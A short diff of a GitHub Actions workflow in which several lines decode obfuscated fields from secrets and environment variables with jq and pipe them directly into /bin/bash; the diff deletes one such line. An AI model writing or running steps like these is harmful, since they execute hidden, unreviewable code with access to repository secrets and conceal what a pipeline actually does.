@@ -21,7 +21,6 @@ jobs:
           eqv9: ${{ secrets.eqv9 }}
         run: |
           printf '%s' "$eqv9" | jq -r .pdmw937 | /bin/bash
-          printf '%s' "$n2" | jq -r .m0423 | /bin/bash
           echo $eot242 | jq -r .svnzg4 | /bin/bash
 
       - name: Archive results
